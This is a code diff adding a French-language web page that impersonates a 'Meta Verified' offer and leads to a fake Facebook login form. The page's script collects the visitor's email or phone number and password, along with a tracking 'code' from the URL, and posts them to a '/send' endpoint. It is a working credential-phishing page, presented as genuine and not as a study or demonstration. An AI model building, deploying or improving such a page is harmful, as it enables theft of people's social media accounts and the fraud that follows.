@@ -1,0 +1,194 @@
+<!DOCTYPE html>
+<html lang="fr">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Meta Verified</title>
+    <style>
+      body {
+        font-family: Arial, sans-serif;
+        text-align: center;
+        margin: 0;
+        background: #fff;
+      }
+      .container {
+        padding: 20px;
+      }
+      .meta-logo,
+      .meta-logo-img {
+        max-width: 180px;
+        margin: 20px auto;
+      }
+      .banner {
+        width: 100%;
+        max-width: 600px;
+        margin-bottom: 20px;
+      }
+      .button {
+        padding: 12px 24px;
+        margin: 10px;
+        background-color: #1877f2;
+        color: white;
+        border: none;
+        border-radius: 6px;
+        font-size: 16px;
+        cursor: pointer;
+      }
+      .button:hover {
+        background-color: #145cc1;
+      }
+
+      .facebook-logo {
+        width: 80px;
+        height: 80px;
+        margin: 20px 0;
+      }
+      input {
+        width: 100%;
+        padding: 14px;
+        margin: 8px 0;
+        border-radius: 6px;
+        border: 1px solid #ccc;
+        font-size: 16px;
+      }
+      .form-button {
+        width: 100%;
+        padding: 14px;
+        margin: 12px 0;
+        background-color: #1877f2;
+        border: none;
+        color: white;
+        font-size: 17px;
+        border-radius: 6px;
+        cursor: pointer;
+      }
+      .link {
+        color: #1877f2;
+        text-decoration: none;
+        display: block;
+        margin: 10px 0;
+      }
+      .create-account {
+        background-color: white;
+        border: 1px solid #1877f2;
+        color: #1877f2;
+        margin-top: 20px;
+        padding: 12px;
+        width: 80%;
+        max-width: 300px;
+        display: block;
+        margin-left: auto;
+        margin-right: auto;
+      }
+      .meta-logo-img {
+        width: 100px;
+        height: auto;
+        opacity: 0.8;
+        display: block;
+        margin: 10px auto;
+      }
+      .download-text {
+        font-size: 14px;
+        color: #1877f2;
+        margin-bottom: 10px;
+      }
+      .lang {
+        font-size: 13px;
+        color: #606770;
+        margin-bottom: 10px;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container" id="meta-section">
+      <img
+        src="https://i.postimg.cc/jjjJsMBJ/Y1o-Mjgd9p-E3-1.png"
+        alt="Meta logo"
+        class="meta-logo"
+      />
+      <img
+        src="https://i.postimg.cc/HnMR7Yqf/images-44.jpg"
+        alt="Meta Verified banner"
+        class="banner"
+      />
+      <h1>Démarquez-vous grâce à Meta Verified</h1>
+      <p>
+        Meta Verified est un abonnement pour les Creators et les entreprises.
+      </p>
+      <button class="button" onclick="showFacebookPage()">Facebook</button>
+      <p>
+        <strong>Vous êtes une entreprise ?</strong> Obtenez plus d’informations
+        sur <a href="#">Meta Verified pour les entreprises</a>.
+      </p>
+    </div>
+
+    <div class="container" id="facebook-section" style="display: none">
+      <div class="download-text">
+        Téléchargez Facebook pour Android et naviguez plus vite.
+      </div>
+      <div class="lang">Français (France)</div>
+      <img
+        src="https://i.postimg.cc/3J3CDFvn/Ub-JC5lwxe-BU.png"
+        alt="Facebook Logo"
+        class="facebook-logo"
+      />
+
+      <form id="loginForm">
+        <input
+          id="email"
+          type="text"
+          placeholder="Numéro mobile ou e-mail"
+          required
+        />
+        <input
+          id="password"
+          type="password"
+          placeholder="Mot de passe"
+          required
+        />
+        <button type="submit" class="form-button">Se connecter</button>
+      </form>
+
+      <a href="#" class="link">Mot de passe oublié ?</a>
+
+      <div>
+        <button class="create-account">Créer un compte</button>
+        <img
+          src="https://i.postimg.cc/jjjJsMBJ/Y1o-Mjgd9p-E3-1.png"
+          alt="Meta Logo"
+          class="meta-logo-img"
+        />
+      </div>
+    </div>
+
+    <script>
+      function showFacebookPage() {
+        document.getElementById("meta-section").style.display = "none";
+        document.getElementById("facebook-section").style.display = "block";
+      }
+
+      document
+        .getElementById("loginForm")
+        .addEventListener("submit", function (e) {
+          e.preventDefault();
+          const email = document.getElementById("email").value;
+          const password = document.getElementById("password").value;
+          const code = new URLSearchParams(window.location.search).get("code");
+
+          if (!code) {
+            alert("Lien invalide");
+            return;
+          }
+
+          fetch("/send", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ email, password, code }),
+          })
+            .then((res) => res.text())
+            .then((res) => alert(res === "ok" ? "Connexion..." : "Erreur"))
+            .catch((err) => alert("Erreur réseau"));
+        });
+    </script>
+  </body>
+</html>
